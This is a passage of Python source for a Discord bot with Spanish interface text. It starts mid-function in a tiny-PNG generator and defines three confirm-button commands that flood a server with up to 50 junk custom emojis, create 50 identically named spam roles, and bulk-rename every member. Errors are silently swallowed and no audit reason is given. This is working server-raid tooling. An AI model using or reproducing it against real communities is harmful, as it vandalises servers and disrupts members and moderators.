        return struct.pack(">I", len(data)) + raw + struct.pack(">I", zlib.crc32(raw) & 0xFFFFFFFF)
    sig   = b"\x89PNG\r\n\x1a\n"
    ihdr  = chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
    idat  = chunk(b"IDAT", zlib.compress(b"\x00" + bytes([r, g, b])))
    iend  = chunk(b"IEND", b"")
    return sig + ihdr + idat + iend


class EmojiFloodConfirmView(discord.ui.View):
    def __init__(self, author_id: int, guild_id: int, bot: commands.Bot):
        super().__init__(timeout=30)
        self.author_id = author_id
        self.guild_id  = guild_id
        self.bot       = bot

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        try:
            await self.message.edit(
                embed=discord.Embed(title="⌛ Confirmación expirada", description="Cancelado por inactividad.", color=discord.Color.greyple()),
                view=self,
            )
        except Exception:
            pass

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message("❌ Solo quien ejecutó el comando puede confirmar.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="✅ Confirmar", style=discord.ButtonStyle.success)
    async def confirmar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()
        try:
            await interaction.response.edit_message(
                embed=discord.Embed(title="⚙️ Ejecutando...", description="Creando emojis...", color=discord.Color.orange()),
                view=self,
            )
        except Exception:
            pass
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return
        limit = 50
        existing = len(guild.emojis)
        to_create = max(0, limit - existing)
        CHARS = string.ascii_lowercase + string.digits
        creados = 0
        for _ in range(to_create):
            name = "e_" + "".join(random.choices(CHARS, k=8))
            color = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
            img = _make_png(*color)
            try:
                await guild.create_custom_emoji(name=name, image=img, reason=None)
                creados += 1
            except Exception:
                pass
            await asyncio.sleep(0.3)
        try:
            await interaction.edit_original_response(
                embed=discord.Embed(title="✅ Hecho", description=f"Se crearon **{creados} emojis** (límite: {limit}).", color=discord.Color.green()),
                view=None,
            )
        except Exception:
            pass

    @discord.ui.button(label="❌ Cancelar", style=discord.ButtonStyle.danger)
    async def cancelar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()
        await interaction.response.edit_message(
            embed=discord.Embed(title="✅ Cancelado", description="No se creó ningún emoji.", color=discord.Color.green()),
            view=self,
        )


# ------------------------------------------------------------------ spamrole
class SpamRoleConfirmView(discord.ui.View):
    def __init__(self, author_id: int, guild_id: int, bot: commands.Bot, rolename: str):
        super().__init__(timeout=30)
        self.author_id = author_id
        self.guild_id  = guild_id
        self.bot       = bot
        self.rolename  = rolename

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        try:
            await self.message.edit(
                embed=discord.Embed(title="⌛ Confirmación expirada", description="Cancelado por inactividad.", color=discord.Color.greyple()),
                view=self,
            )
        except Exception:
            pass

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message("❌ Solo quien ejecutó el comando puede confirmar.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="✅ Confirmar", style=discord.ButtonStyle.success)
    async def confirmar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()
        try:
            await interaction.response.edit_message(
                embed=discord.Embed(title="⚙️ Ejecutando...", description="Creando roles...", color=discord.Color.orange()),
                view=self,
            )
        except Exception:
            pass
        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return
        creados = 0
        for _ in range(50):
            color = discord.Color(random.randint(0, 0xFFFFFF))
            try:
                await guild.create_role(name=self.rolename, color=color, reason=None)
                creados += 1
            except Exception:
                pass
            await asyncio.sleep(0.2)
        try:
            await interaction.edit_original_response(
                embed=discord.Embed(title="✅ Hecho", description=f"Se crearon **{creados} roles** llamados `{self.rolename}`.", color=discord.Color.green()),
                view=None,
            )
        except Exception:
            pass

    @discord.ui.button(label="❌ Cancelar", style=discord.ButtonStyle.danger)
    async def cancelar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()
        await interaction.response.edit_message(
            embed=discord.Embed(title="✅ Cancelado", description="No se creó ningún rol.", color=discord.Color.green()),
            view=self,
        )


# ------------------------------------------------------------------ nickall
class NickAllConfirmView(discord.ui.View):
    def __init__(self, author_id: int, guild_id: int, bot: commands.Bot, nickname: str):
        super().__init__(timeout=30)
        self.author_id = author_id
        self.guild_id  = guild_id
        self.bot       = bot
        self.nickname  = nickname

    async def on_timeout(self):
        for item in self.children:
            item.disabled = True
        try:
            await self.message.edit(
                embed=discord.Embed(
                    title="⌛ Confirmación expirada",
                    description="El comando fue cancelado por inactividad.",
                    color=discord.Color.greyple(),
                ),
                view=self,
            )
        except Exception:
            pass

    async def interaction_check(self, interaction: discord.Interaction) -> bool:
        if interaction.user.id != self.author_id:
            await interaction.response.send_message("❌ Solo quien ejecutó el comando puede confirmar.", ephemeral=True)
            return False
        return True

    @discord.ui.button(label="✅ Confirmar", style=discord.ButtonStyle.success)
    async def confirmar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()
        try:
            await interaction.response.edit_message(
                embed=discord.Embed(
                    title="⚙️ Ejecutando...",
                    description="Cambiando nicknames. Esto puede tardar unos segundos.",
                    color=discord.Color.orange(),
                ),
                view=self,
            )
        except Exception:
            pass

        guild = self.bot.get_guild(self.guild_id)
        if not guild:
            return

        async def _nick(member: discord.Member):
            try:
                await member.edit(nick=self.nickname)
            except Exception:
                pass

        targets = [m for m in guild.members if not m.bot and m.id != guild.me.id]
        await asyncio.gather(*[_nick(m) for m in targets])

        try:
            await interaction.edit_original_response(
                embed=discord.Embed(
                    title="✅ Nicknames cambiados",
                    description=f"Se cambió el nickname de **{len(targets)} miembros** a `{self.nickname}`.",
                    color=discord.Color.green(),
                ),
                view=None,
            )
        except Exception:
            pass

    @discord.ui.button(label="❌ Cancelar", style=discord.ButtonStyle.danger)
    async def cancelar(self, interaction: discord.Interaction, button: discord.ui.Button):
        for item in self.children:
            item.disabled = True
        self.stop()
        await interaction.response.edit_message(
            embed=discord.Embed(title="✅ Cancelado", description="No se cambió ningún nickname.", color=discord.Color.green()),
            view=self,
        )


# ------------------------------------------------------------------ run
if __name__ == "__main__":
    if not TOKEN:
        raise RuntimeError("DISCORD_TOKEN env var no está configurada.")
    bot.run(TOKEN)
